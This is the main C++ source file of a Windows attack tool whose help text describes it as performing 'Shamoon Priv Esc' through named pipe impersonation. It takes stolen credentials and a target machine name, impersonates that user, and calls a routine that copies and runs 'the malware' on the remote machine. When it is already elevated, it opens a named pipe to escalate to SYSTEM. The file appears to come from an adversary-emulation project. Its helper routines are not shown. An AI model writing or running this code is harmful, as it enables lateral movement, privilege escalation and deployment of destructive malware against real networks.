#include <iostream>
#include <cstdio>

#include "getopt.h"

#include <windows.h>

#include "impersonateUser.h"
#include "namedPipeImpersonation.h"
#include "helpers.h"

using namespace std;

int main(int argc, char *argv[]) {
    struct option long_opts[] = {
        { "help", no_argument, nullptr, 'h'},
        { nullptr, 0, nullptr, '\0'}
    };
    int option, option_index = 0;
    while ((option = getopt_long(argc, argv, "h", long_opts, &option_index)) != -1) {
        switch (option) {
            case 'h':
                cout << "This program performs Shamoon Priv Esc using named pipe impersonation.\n";
                cout << "The following arguments are required:\n";
                cout << "\t[username] - REQUIRED: the name of the user account to log on to\n";
                cout << "\t[password] - REQUIRED: the plaintext password for the user account specified by lpszUsername\n";
                cout << "\t[domain] - REQUIRED: name of doman or server whose account database contains the lpszUsername acct\n";
                cout << "\t[targetMachine] - REQUIRED: name of the remote target machine that the malware will be copied to\n";
                cout << "Usage: ./ShamoonPrivEsc <username> <password> <domain> <targetMachine>";
        }
    }
    if (argc < 5) {
        cout << "[!] ERROR: Must specify username, password, and target domain as arguments" << endl;
        return -1;
    }
    if (argc >= 6) {
        cout << "[!] ERROR: Too many arguments specified. Use the --help flag to see options" << endl;
        return -1;
    }

    if (!CurrentProcessIsElevated()) {
        const char *kUsername = argv[1];
        const char *kPassword = argv[2];
        const char *kDomain = argv[3];
        const char *kTargetMachine = argv[4];

        cout << "[+] Process is not elevated, proceeding with ImpersonateUserWithCredentials" << endl;
        if (!ImpersonateUserWithCredentials(kUsername, kPassword, kDomain)) {
            cout << "[!] ImpersonateUserWithCredentials() failed" << endl;
            return -1;
        }
        cout << "[+] ImpersonateUserWithCredentials() successful" << endl;
        return ExecuteShamoonOnRemoteMachine(
            kUsername,
            kPassword,
            kDomain,
            kTargetMachine);
    } else {
        cout << "[+] Shamoon running in elevated process" << endl;
        HANDLE server_pipe = CreateNamedPipeAndConnectClient();
        if (!server_pipe) {
            cout << "[!] CreateNamedPipeAndConnectClient() failed" << endl;
            return -1;
        }
        if (!ElevateToSystem(server_pipe)) {
            return -1;
        }
    }
}
